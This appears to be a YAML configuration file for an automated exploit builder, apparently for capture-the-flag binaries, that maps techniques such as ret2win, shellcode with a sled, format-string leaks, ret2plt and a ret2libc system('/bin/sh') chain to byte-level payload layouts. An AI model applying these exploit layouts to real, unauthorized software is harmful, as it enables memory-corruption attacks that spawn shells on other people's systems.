# The build layouts: how a decided technique becomes bytes. Data, not
# code - a pack can add or override a layout for its own techniques
# (pack `build:` sections follow the same slot vocabulary and pass the
# same armor).
#
# Slots:
#   [padding, measured_offset]        - the measured offset, as filler
#   [qword, win]                      - the win_symbol address, 8 bytes
#   [qword, gadget:TYPE]              - the address of that gadget type
#   [dword, ...]                      - the same, 4 bytes (x86)
#   [shellcode, sh|bash]              - the assembled stub
#   [shellcode, file]                 - the operator-provided payload file
#   [chain, REF, REF, ...]            - a ROP chain: one arch-width word
#                                       per REF, resolved in order
#
# chain references:
#   gadget:TYPE      - the address of that gadget type (facts)
#   plt_addr:NAME    - the PLT stub address (profiler facts)
#   got_addr:NAME    - the GOT entry address (profiler facts)
#   win              - the win_symbol address
#   leak:NAME        - a leaked_address(name) fact (harvest/banner)
#   sym:NAME         - a sym_addr(name) fact (a DEFINED symbol of a
#                      non-PIE module: the announced-nothing twin's
#                      stage function, argument string, buffer)
#   const:N          - the literal N (a syscall number, an offset)
#
# One technique may ship several shapes: replace `layout:` with
# `variants:` (a list of {name:, layout:}) and the builder walks them,
# the first whose references the facts satisfy wins.
#
# resolved at build time from the facts + the measurement; anything the
# facts cannot supply is a loud BuildError, never a guessed byte.

ret2func:
  arch: any
  layout:
    - [padding, measured_offset]
    - [qword, win]

ret2win:
  arch: any
  layout:
    - [padding, measured_offset]
    - [qword, win]

shellcode:
  arch: any
  layout:
    - [padding, measured_offset, sled]
    - [qword, leak:buf]
    - [shellcode, sh]

banner_leak:
  arch: any
  layout:
    - [padding, measured_offset]
    - [qword, leak:win]

# the fmtstr class: no return slot to overwrite - the format string IS
# the payload. The static stage is the leak (the buffer's argument
# index comes off the frame, fact fmt_offset); the write stage derives
# its targets from that leak at runtime (the exploit's job, not a
# static byte layout).
fmtstr_leak:
  arch: any
  layout:
    - [fmtstr_leak, fmt_offset]

fmtstr_write:
  arch: any
  layout:
    - [fmtstr_leak, fmt_offset]
ret2plt:
  arch: any
  layout:
    - [padding, measured_offset]
    - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]

ret2plt_leak:
  arch: any
  # the leak-first stage: puts@plt prints a GOT/.bss slot's raw bytes
  # (the libc or heap address rides out) - the exploit derives the
  # strike from the leak and finishes the job itself
  layout:
    - [padding, measured_offset]
    - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]

ret2libc:
  arch: any
  variants:
    # the strike: the full system("/bin/sh") chain - it needs the
    # leak facts the exploit's leak round (or a harvest) supplies
    - name: strike
      layout:
        - [padding, measured_offset]
        - [chain, "gadget:ret_align", "gadget:pop_rdi_ret", "leak:binsh", "leak:system"]
    # the leak round: puts(GOT[puts]) prints the raw libc pointer -
    # the strike derives the libc base from what answers
    - name: leak_stage
      layout:
        - [padding, measured_offset]
        - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
orw:
  arch: any
  layout:
    - [padding, measured_offset, sled]
    - [qword, leak:input]
    - [shellcode, orw, flag.txt]
